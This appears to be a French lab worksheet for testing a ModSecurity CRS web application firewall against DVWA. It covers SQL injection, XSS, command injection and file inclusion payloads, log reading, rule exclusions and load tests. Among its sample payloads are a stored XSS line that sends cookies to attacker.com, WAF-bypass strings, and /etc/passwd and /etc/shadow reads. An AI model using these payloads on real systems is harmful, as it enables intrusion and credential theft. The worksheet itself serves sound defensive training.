# Exercices Pratiques - Tests de Sécurité WAF

Ce document contient des exercices pratiques pour tester les capacités du WAF ModSecurity CRS.

---

## Exercice 1 : SQL Injection (SQLi)

### Objectif
Comprendre comment le WAF détecte et bloque les attaques par injection SQL.

### Payloads à tester

#### 1.1 Injection basique
```sql
' OR '1'='1
' OR 1=1 --
' OR '1'='1' --
' OR '1'='1' /*
```

#### 1.2 Injection UNION
```sql
' UNION SELECT null,null --
' UNION SELECT username,password FROM users --
```

#### 1.3 Injection aveugle (Blind SQLi)
```sql
' AND 1=1 --
' AND 1=2 --
' AND SLEEP(5) --
```

#### 1.4 Contournement simple
```sql
'/**/OR/**/'1'='1
' OR '1'='1' -- -
' OR 1=1#"
```

### Questions
1. Quels payloads sont bloqués par le WAF ?
2. Quels sont les codes de réponse HTTP ?
3. Identifiez les règles CRS déclenchées dans les logs.
4. À quel niveau de paranoïa chaque payload est-il détecté ?

---

## Exercice 2 : Cross-Site Scripting (XSS)

### Objectif
Tester la détection des attaques XSS par le WAF.

### 2.1 XSS Réfléchi (Reflected XSS)

Testez ces payloads dans la page **XSS (Reflected)** de DVWA :

#### Basiques
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
```

#### Événements HTML
```html
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
```

#### Encodage
```html
<script>alert('XSS')</script>
%3Cscript%3Ealert('XSS')%3C/script%3E
```

#### Bypass simple
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
" onclick="alert('XSS')
```

### 2.2 XSS Stocké (Stored XSS)

Testez dans la page **XSS (Stored)** :

```html
<script>alert('Stored XSS')</script>
<img src="x" onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

### Questions
1. Quelle différence fait le WAF entre XSS réfléchi et stocké ?
2. Quels payloads passent à travers le WAF ?
3. Comment l'encodage affecte-t-il la détection ?

---

## Exercice 3 : Command Injection

### Objectif
Tester la détection des injections de commandes système.

### Payloads

#### 3.1 Commandes simples
```bash
; cat /etc/passwd
| cat /etc/passwd
` cat /etc/passwd `
$(cat /etc/passwd)
```

#### 3.2 Commandes chaînées
```bash
; ls -la ; cat /etc/passwd
| whoami | id
&& ping -c 4 127.0.0.1
```

#### 3.3 Contournement
```bash
;c${z}at /et${z}c/pas${z}swd
;cat$IFS/etc/passwd
;/bin/cat /etc/passwd
```

### Questions
1. Quels caractères spéciaux déclenchent le WAF ?
2. Quelle règle CRS est activée par ces payloads ?
3. Testez avec différents niveaux de paranoïa (1 vs 4).

---

## Exercice 4 : File Inclusion

### Objectif
Tester la détection des attaques LFI (Local File Inclusion) et RFI (Remote File Inclusion).

### 4.1 LFI (Local File Inclusion)

#### Traversée de répertoire
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
```

#### Fichiers sensibles à cibler
```
../../../etc/passwd
../../../etc/shadow
../../../proc/self/environ
../../../var/log/apache2/access.log
```

#### Encodage et bypass
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### 4.2 RFI (Remote File Inclusion)

```
http://evil.com/shell.php
http://127.0.0.1:8080/test.txt
ftp://attacker.com/backdoor.txt
```

### Questions
1. Le WAF fait-il la distinction entre LFI et RFI ?
2. Quels fichiers systèmes sont protégés ?
3. L'encodage permet-il de contourner le WAF ?

---

## Exercice 5 : Analyse de Logs

### Objectif
Apprendre à lire et interpréter les logs ModSecurity.

### 5.1 Structure d'un log

Exemple de log JSON :

```json
{
  "transaction": {
    "client_ip": "172.20.0.1",
    "time_stamp": "2024-01-15T10:30:00Z",
    "request": {
      "method": "GET",
      "uri": "/?id=1' OR '1'='1",
      "headers": {
        "Host": "localhost",
        "User-Agent": "Mozilla/5.0..."
      }
    },
    "messages": [
      {
        "message": "SQL Injection Attack Detected",
        "details": {
          "ruleid": "942100",
          "severity": "CRITICAL",
          "file": "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
          "line": "123"
        }
      }
    ],
    "rules_messages": [
      "Pattern match detected"
    ]
  }
}
```

### 5.2 Questions d'analyse

Pour chaque attaque testée, répondez :

1. **Informations générales**
   - Quelle est l'IP source ?
   - Quelle est la date et l'heure de l'attaque ?
   - Quelle méthode HTTP a été utilisée ?

2. **Détails de la règle**
   - Quel est le `ruleid` déclenché ?
   - Quelle est la sévérité ?
   - Quel fichier de règles est concerné ?

3. **Impact**
   - Quelle action a été prise (block, log, allow) ?
   - Quel code HTTP a été retourné ?

### 5.3 Exercice pratique

Exécutez cette commande et analysez le résultat :

```bash
# Générer du trafic
curl "http://localhost/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# Voir le log correspondant
docker exec modsecurity_waf grep "OR '1'='1" /var/log/modsecurity/audit.log | jq .
```

---

## Exercice 6 : Ajustement des Règles

### Objectif
Apprendre à configurer les exclusions et les niveaux de paranoïa.

### 6.1 Modifier le niveau de paranoïa

Testez les mêmes payloads avec différents niveaux :

```yaml
# docker-compose.simple.yml
environment:
  - PARANOIA=1  # Tester avec 1, 2, 3, 4
```

Pour chaque niveau, notez :
- Nombre de règles déclenchées
- Faux positifs
- Performances (temps de réponse)

### 6.2 Créer une exclusion

Créez une exclusion pour permettre une requête légitime :

```apache
# modsecurity/exclusions.conf
SecRule REQUEST_FILENAME "@streq /legitimate-endpoint" \
    "id:2000,\
    phase:1,\
    pass,\
    nolog,\
    ctl:ruleRemoveById=942100"
```

### Questions
1. Quand faut-il augmenter le niveau de paranoïa ?
2. Quels sont les risques d'une exclusion trop permissive ?
3. Comment valider qu'une exclusion est sécurisée ?

---

## Exercice 7 : Tests de Performance

### Objectif
Mesurer l'impact du WAF sur les performances.

### 7.1 Test de charge simple

```bash
# Sans WAF (accès direct à DVWA si configuré)
ab -n 1000 -c 10 http://localhost:8080/

# Avec WAF
ab -n 1000 -c 10 http://localhost/
```

### 7.2 Test avec attaques

```bash
# Générer 100 requêtes avec payload SQLi
for i in {1..100}; do
  curl -s "http://localhost/?id=1' OR '1'='1" > /dev/null
done
```

### Questions
1. Quelle est la latence ajoutée par le WAF ?
2. Comment le WAF gère-t-il les attaques massives ?
3. Quelle est la consommation CPU/mémoire ?

---

## Exercice 8 : Scénario complet

### Scénario : Audit de sécurité

Vous êtes un auditeur sécurité. Testez le WAF avec ce plan :

#### Phase 1 : Reconnaissance (10 min)
1. Identifier les endpoints disponibles
2. Déterminer le niveau de paranoïa
3. Identifier la version du WAF

#### Phase 2 : Tests d'intrusion (30 min)
1. Tester chaque type d'attaque
2. Documenter les détections
3. Essayer des techniques de contournement

#### Phase 3 : Analyse (20 min)
1. Collecter tous les logs
2. Créer un rapport des règles déclenchées
3. Identifier les éventuelles failles

### Rapport attendu

```markdown
# Rapport d'Audit WAF

## Résumé
- Date : [DATE]
- WAF : ModSecurity CRS
- Niveau de paranoïa : [NIVEAU]

## Résultats des tests

| Type d'attaque | Payloads testés | Détectés | Bloqués |
|----------------|-----------------|----------|---------|
| SQL Injection | 15 | 12 | 12 |
| XSS | 10 | 10 | 10 |
| ... | ... | ... | ... |

## Conclusion
- Efficacité globale : [X]%
- Recommandations : ...
```

---

## Annexe : Outils recommandés

### Outils de test
- **Burp Suite** : Proxy d'interception et scanner
- **OWASP ZAP** : Alternative open source à Burp
- **sqlmap** : Détection automatisée de SQLi
- **Nikto** : Scanner de vulnérabilités web

### Commandes curl utiles

```bash
# Test basique
curl -v http://localhost/?test=<script>

# Avec header personnalisé
curl -H "User-Agent: Test" http://localhost/

# POST avec données
curl -X POST -d "id=1' OR '1'='1" http://localhost/login.php

# Suivre les redirections
curl -L http://localhost/
```

---

**Bon courage pour vos tests !**